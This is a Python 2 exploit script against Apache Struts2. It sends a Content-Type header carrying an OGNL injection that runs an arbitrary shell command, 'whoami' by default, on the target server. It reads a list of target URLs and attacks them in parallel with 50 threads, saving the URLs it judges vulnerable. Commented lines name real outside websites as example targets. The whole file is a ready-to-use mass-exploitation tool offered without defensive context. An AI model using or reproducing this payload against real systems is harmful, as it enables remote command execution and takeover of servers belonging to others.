#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import threadpool

def deal_result(request, result):
    if str(result[0]) == '1':
        save_file.write(str(result[1]) + "\n")
    else:
        print "NOT write"
    print "the result is %s" % (request.requestID)

"""
def poc():
    sys.argv[2] = "whoami"
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+sys.argv[2]+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(str(sys.argv[1]), datagen, headers=header)
    try:
        response = urllib2.urlopen(request, timeout=8)
    except:
        print "connect time out"
        pass
    print response.read()
"""
def attack(url, command="whoami"):
    #sys.argv[2] = "whoami"
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(str(url), datagen, headers=header)
    try:
        response = urllib2.urlopen(request, timeout=8)
        result = response.read()
    except:
        print "connect time out: " + url
        return '2'
    #result = response.read()
    #print result
    if len(result) < 100:
        print "OK: " + url
        return '1', url
    else:
        print "Failed: " + url
        return '2'

#poc()
if __name__ == '__main__':
    #command = "whoami"
    save_file = open("OK_re1", 'a+')
    lists = open(str(sys.argv[1]), 'r')
    urls = []
    for list in lists.readlines():
        list = list.strip('\n')
        urls.append(list)
    pool = threadpool.ThreadPool(50)
    requests = threadpool.makeRequests(attack, urls, deal_result)
    [pool.putRequest(req) for req in requests]
    pool.wait()
    """
    #url = "http://www.jogyesa.kr/user/indexMain.action?command=&siteId=english"
    #url2 = "http://www.med.cgu.edu.tw/~m88/cgi-bin/han.pl?search=ls"
        if attack(list, command):
            save_file.write(list + "\n")
    """
    save_file.close()
    lists.close()
